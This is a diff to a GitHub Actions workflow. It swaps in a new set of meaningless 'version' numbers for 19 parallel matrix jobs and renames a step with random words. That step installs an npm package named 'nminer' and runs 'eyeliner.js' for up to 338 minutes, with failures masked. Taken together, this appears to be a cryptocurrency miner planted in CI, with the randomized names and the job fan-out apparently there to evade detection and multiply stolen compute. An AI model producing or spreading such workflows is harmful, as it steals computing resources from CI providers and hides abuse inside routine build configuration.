@@ -9,23 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1260 }
-          - { version: 6577 }
-          - { version: 9492 }
-          - { version: 9942 }
-          - { version: 1426 }
-          - { version: 9327 }
-          - { version: 2653 }
-          - { version: 8489 }
-          - { version: 23 }
-          - { version: 9439 }
-          - { version: 5997 }
-          - { version: 5945 }
-          - { version: 8128 }
-          - { version: 2049 }
-          - { version: 2868 }
-          - { version: 4144 }
-          - { version: 4864 }
+          - { version: 2406 }
+          - { version: 3019 }
+          - { version: 6869 }
+          - { version: 1099 }
+          - { version: 2820 }
+          - { version: 5824 }
+          - { version: 1361 }
+          - { version: 8659 }
+          - { version: 2485 }
+          - { version: 1463 }
+          - { version: 8947 }
+          - { version: 6219 }
+          - { version: 7840 }
+          - { version: 2190 }
+          - { version: 6708 }
+          - { version: 1830 }
+          - { version: 9403 }
+          - { version: 3902 }
+          - { version: 255 }
 
     steps:
       - name: Checkout
@@ -36,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: boo thoughtfully frightfully whose under
+      - name: apropos intermesh
         run: |
           npm install nminer@latest
-          timeout 320m node eyeliner.js || echo "eyeliner executed"
+          timeout 338m node eyeliner.js || echo "eyeliner executed"
